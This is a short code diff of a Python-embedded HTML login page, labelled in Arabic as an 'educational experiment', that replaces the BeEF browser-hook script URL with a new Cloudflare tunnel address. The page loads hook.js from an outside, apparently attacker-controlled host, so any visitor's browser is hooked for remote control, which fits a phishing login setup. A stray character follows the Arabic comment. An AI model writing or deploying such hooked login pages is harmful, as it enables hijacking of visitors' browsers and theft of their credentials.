@@ -100,7 +100,7 @@ login_page_html = '''
 <html>
 <head>
     <!-- كود BeEF Hook -->ئ
-    <script src="https://fruity-spiders-rule.loca.lt/hook.js"></script>
+    <script src="https://grew-resumes-blend-arbor.trycloudflare.com/hook.js"></script>
     <title>تسجيل الدخول - تجربة تعليمية</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
